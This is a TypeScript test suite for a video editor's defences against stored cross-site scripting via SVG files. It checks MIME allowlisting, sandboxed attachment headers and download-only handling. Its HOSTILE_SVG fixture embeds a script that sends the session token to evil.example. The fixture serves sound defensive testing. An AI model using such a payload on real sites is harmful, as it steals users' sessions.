import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startServer, type RunningServer } from "../src/server/app.js";
import { defaultConfig } from "../src/server/config.js";
import { materializeWebAsset } from "../src/materialize/web.js";
import { APPROVED_MEDIA_MIME } from "../src/materialize/schemas.js";
import { createPolicy, type PermissionGrant, type PermissionPolicy } from "../src/permissions/policy.js";
import type { FetchLike, FetchResponseLike } from "../src/util/fetchLike.js";
import type { HostResolver } from "../src/util/ssrf.js";

/*
 * Stored-XSS defense in depth. A materialized or served SVG is an active document: opened
 * same-origin it can read sessionStorage (the ove_token). This suite proves the three
 * layers that stop it: the remote/materialization MIME allowlist rejects SVG, the media
 * content endpoint serves every blob as a sandboxed attachment (never inline/script
 * capable), and the browser app downloads active content rather than window-opening it.
 */

const NOW = new Date("2026-08-01T10:00:00.000Z");
const grant = (action: PermissionGrant["action"]): PermissionGrant => ({ action, grantedBy: "operator", grantedAt: NOW.toISOString() });
const bothGrants = (): PermissionPolicy => createPolicy([grant("network"), grant("media-upload")]);
const RIGHTS = { license: "CC0-1.0", attribution: "Test", reusable: true as const, source: "https://example.com/x" };
const publicResolve: HostResolver = async () => ["93.184.216.34"];

/** A hostile SVG that, rendered as a document, would exfiltrate the session token. */
const HOSTILE_SVG = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg"><script>document.location="https://evil.example/?t="+sessionStorage.ove_token</script></svg>',
);

function svgResponse(): FetchResponseLike {
  const ab = new ArrayBuffer(HOSTILE_SVG.length);
  new Uint8Array(ab).set(HOSTILE_SVG);
  return {
    status: 200,
    headers: { get: (n: string) => (n.toLowerCase() === "content-type" ? "image/svg+xml" : null) },
    arrayBuffer: async () => ab,
    text: async () => HOSTILE_SVG.toString("utf8"),
    json: async () => ({}),
  };
}

describe("remote/materialization MIME allowlist rejects SVG", () => {
  it("APPROVED_MEDIA_MIME no longer contains image/svg+xml but keeps raster/video/audio", () => {
    expect(APPROVED_MEDIA_MIME.has("image/svg+xml")).toBe(false);
    for (const m of ["image/jpeg", "image/png", "image/webp", "image/gif", "video/mp4", "audio/mpeg"]) {
      expect(APPROVED_MEDIA_MIME.has(m)).toBe(true);
    }
  });

  it("materializeWebAsset refuses an SVG response and writes nothing", async () => {
    const dir = mkdtempSync(join(tmpdir(), "oct-svg-mat-"));
    try {
      const fetch: FetchLike = async () => svgResponse();
      await expect(
        materializeWebAsset({ url: "https://cdn.example.com/x.svg", rights: RIGHTS, relPath: "x.svg", outDir: dir, policy: bothGrants(), fetch, resolve: publicResolve, now: NOW }),
      ).rejects.toThrow(/not an approved media type/i);
      expect(existsSync(join(dir, "x.svg"))).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("browser app downloads active content, never window-opens a blob", () => {
  it("public/app.js has no window.open of a media blob and uses a download anchor", () => {
    const src = readFileSync(resolve(process.cwd(), "public", "app.js"), "utf8");
    expect(src).not.toContain("window.open(");
    expect(src).toContain("download");
  });
});

describe("media content endpoint serves sandboxed attachments (defense in depth)", () => {
  const TOKENS = { editor: "editor-token-0123456789abcdef", viewer: "viewer-token-0123456789abcdef" };
  const roots: string[] = [];
  let server: RunningServer;
  let projectId = "";

  const okSvgFetch: FetchLike = async () => svgResponse();

  beforeAll(async () => {
    const storageRoot = mkdtempSync(join(tmpdir(), "oct-xss-store-"));
    const tempDir = mkdtempSync(join(tmpdir(), "oct-xss-temp-"));
    const publicDir = mkdtempSync(join(tmpdir(), "oct-xss-public-"));
    roots.push(storageRoot, tempDir, publicDir);
    writeFileSync(join(publicDir, "index.html"), "<!doctype html><title>Octupie Video Editor</title>");
    const config = defaultConfig({
      host: "127.0.0.1",
      port: 0,
      dbPath: ":memory:",
      storageRoot,
      tempDir,
      publicDir,
      grants: [grant("network"), grant("media-upload")],
      users: [
        { id: "u-editor", tenantId: "t1", username: "editor", role: "editor", token: TOKENS.editor },
        { id: "u-viewer", tenantId: "t1", username: "viewer", role: "viewer", token: TOKENS.viewer },
      ],
    });
    server = await startServer(config, { fetch: okSvgFetch, resolve: publicResolve });
    const created = await api("/api/projects", { method: "POST", token: TOKENS.editor, body: { name: "XSS test" } });
    projectId = created.json.project.id;
  });

  afterAll(async () => {
    await server.close();
    for (const p of roots.splice(0)) rmSync(p, { recursive: true, force: true });
  });

  async function api(path: string, opts: { method?: string; token?: string; body?: unknown } = {}): Promise<{ status: number; json: any; res: Response }> {
    const headers: Record<string, string> = {};
    if (opts.token) headers.authorization = `Bearer ${opts.token}`;
    let body: BodyInit | undefined;
    if (opts.body !== undefined) { headers["content-type"] = "application/json"; body = JSON.stringify(opts.body); }
    const res = await fetch(server.url + path, { method: opts.method ?? "GET", headers, ...(body !== undefined ? { body } : {}) });
    const text = await res.text();
    const ct = res.headers.get("content-type");
    const json = ct && ct.includes("application/json") && text ? JSON.parse(text) : null;
    return { status: res.status, json, res };
  }

  it("serves a locally generated SVG as a sandboxed, non-inline attachment", async () => {
    const gen = await api(`/api/projects/${projectId}/generate/image`, { method: "POST", token: TOKENS.editor, body: { prompt: "Retention up 30 percent" } });
    expect(gen.status).toBe(201);
    const mediaId = gen.json.media.id;
    const res = await fetch(server.url + `/api/projects/${projectId}/media/${mediaId}/content`, { headers: { authorization: `Bearer ${TOKENS.viewer}` } });
    expect(res.status).toBe(200);
    // Real mime is preserved so the app can still preview it via a fetched blob.
    expect(res.headers.get("content-type")).toContain("image/svg+xml");
    // But it is never a trusted document: download, sandbox, no active content, no sniffing.
    expect((res.headers.get("content-disposition") || "").toLowerCase()).toContain("attachment");
    expect((res.headers.get("content-disposition") || "").toLowerCase()).not.toContain("inline");
    const csp = res.headers.get("content-security-policy") || "";
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("sandbox");
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("rejects materializing an SVG over the web end to end (400, no bytes registered)", async () => {
    const before = (await api(`/api/projects/${projectId}/media`, { token: TOKENS.viewer })).json.media.length;
    const mat = await api(`/api/projects/${projectId}/materialize/web`, { method: "POST", token: TOKENS.editor, body: { url: "https://cdn.example.com/evil.svg", rights: RIGHTS } });
    expect(mat.status).toBe(400);
    expect(mat.json.error.code).toBe("materialize-failed");
    const after = (await api(`/api/projects/${projectId}/media`, { token: TOKENS.viewer })).json.media.length;
    expect(after).toBe(before);
  });
});
